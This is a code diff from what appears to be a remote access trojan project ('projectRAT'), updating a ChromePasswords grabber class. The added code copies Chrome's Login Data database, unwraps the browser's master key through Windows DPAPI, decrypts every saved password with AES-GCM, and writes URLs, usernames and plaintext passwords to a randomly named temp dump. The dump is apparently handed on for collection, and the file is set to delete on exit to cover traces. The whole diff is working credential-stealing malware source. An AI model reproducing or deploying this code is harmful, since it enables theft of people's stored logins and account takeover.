@@ -2,13 +2,25 @@ package in.momin5.projectRAT.request.grabbers;
 
 import com.sun.jna.platform.win32.Crypt32Util;
 import in.momin5.projectRAT.request.Request;
+import org.json.simple.JSONObject;
+import org.json.simple.parser.JSONParser;
 
+import javax.crypto.Cipher;
+import javax.crypto.spec.GCMParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.sql.*;
+import java.io.FileReader;
+import java.nio.charset.StandardCharsets;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.ResultSet;
+import java.sql.Statement;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.Random;
 
 public class ChromePasswords implements Request {
 
@@ -17,15 +29,15 @@ public class ChromePasswords implements Request {
     @Override
     public void init() throws Exception {
         ArrayList<String> list = getChromePass();
-        infoDumpFile = new File(System.getProperty("java.io.tmpdir") + "/chrome256567.dump");
+        infoDumpFile = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".dump");
         FileOutputStream dumpStream = new FileOutputStream(infoDumpFile);
         for(String s: list){
-            System.out.println(s);
             dumpStream.write(s.getBytes());
             dumpStream.write("\n".getBytes());
         }
         dumpStream.flush();
         dumpStream.close();
+        infoDumpFile.deleteOnExit();
     }
 
     @Override
@@ -36,7 +48,7 @@ public class ChromePasswords implements Request {
     @Override
     public File[] getFiles() {
         return new File[]{
-          infoDumpFile
+                infoDumpFile
         };
     }
 
@@ -46,9 +58,20 @@ public class ChromePasswords implements Request {
         Statement statement = null;
 
         try {
-            String stmt = "jdbc:sqlite:C:/Users/" + System.getProperty("user.name") +"/AppData/Local/Google/Chrome/User Data/Default/Login Data";
+            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data";
+            String finalDestination = System.getProperty("java.io.tmpdir") + "/Data";
+            File finalDestinationFile = new File(finalDestination);
+            FileInputStream in = new FileInputStream(loginDataFile);
+            FileOutputStream out = new FileOutputStream(finalDestinationFile);
+            int n;
+            while ((n = in.read()) != -1){
+                out.write(n);
+            }
+            in.close();
+            out.close();
+
+            String stmt = "jdbc:sqlite:" + finalDestination;
             conn = DriverManager.getConnection(stmt);
-            //conn.setAutoCommit(false);
 
             statement = conn.createStatement();
             ResultSet rs = statement.executeQuery("SELECT * FROM logins;");
@@ -57,10 +80,9 @@ public class ChromePasswords implements Request {
                 if(url == null) url = "URL not found";
                 String username = rs.getString("username_value");
                 if(username == null) username = "Username not found";
-                Blob pass = rs.getBlob("password_value");
-                InputStream passwordHashStream = rs.getBinaryStream("password_value");
-                info.add(String.format("URL: %s ;USERNAME: %s ;Password: ",url,username));
-                System.out.println(streamToString(passwordHashStream));
+                //InputStream passwordHashStream = rs.getBinaryStream("password_value");
+                byte[] encpass = rs.getBytes("password_value");
+                info.add(String.format("URL: %s ;USERNAME: %s ;Password: %s",url,username, getDecryptedValue(encpass)));
             }
             rs.close();
             statement.close();
@@ -73,34 +95,26 @@ public class ChromePasswords implements Request {
         return info;
     }
 
-    public static String encryptedBinaryStreamToDecryptedString(String s) throws IOException {
-        StringBuilder toRet2=new StringBuilder();
-        byte[] toRet = Crypt32Util.cryptUnprotectData(s.getBytes());
-        for (byte b: toRet){
-            toRet2.append((char)b);
-        }
-        return toRet2.toString();
+    private String getDecryptedValue(byte[] data) throws Exception {
+        String pathLocalState = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Local State";
+        JSONObject jsonObject = (JSONObject) new JSONParser().parse(new FileReader(pathLocalState));
+        String encryptedMasterKeyB64 = (String) ((JSONObject) jsonObject.get("os_crypt")).get("encrypted_key");
+
+        byte[] encryptedMKWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyB64);
+        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMKWithPrefix, 5, encryptedMKWithPrefix.length);
+
+        byte[] masterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);
+
+        byte[] nonce = Arrays.copyOfRange(data, 3, 3 + 12);
+        byte[] ciphertextTag = Arrays.copyOfRange(data, 3 + 12, data.length);
+
+        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
+        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
+        cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
+        byte[] password = cipher.doFinal(ciphertextTag);
+
+        return new String(password, StandardCharsets.UTF_8);
     }
 
-    public static byte[] hexStringToByteArray(String s) {
-        int len = s.length();
-        byte[] data = new byte[len / 2];
-        for (int i = 0; i < len; i += 2) {
-            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
-                    + Character.digit(s.charAt(i+1), 16));
-        }
-        return data;
-    }
-
-    public static String streamToString(InputStream b) throws IOException{
-        StringBuilder toRet=new StringBuilder();
-        String s;
-        while (b.available()>0){
-            s=String.format("%s",Integer.toHexString(b.read()));
-            if (s.length()==1) toRet.append("0"+s+"");
-            else toRet.append(s+"");
-        }
-        b.close();
-        return toRet.toString();
-    }
 }
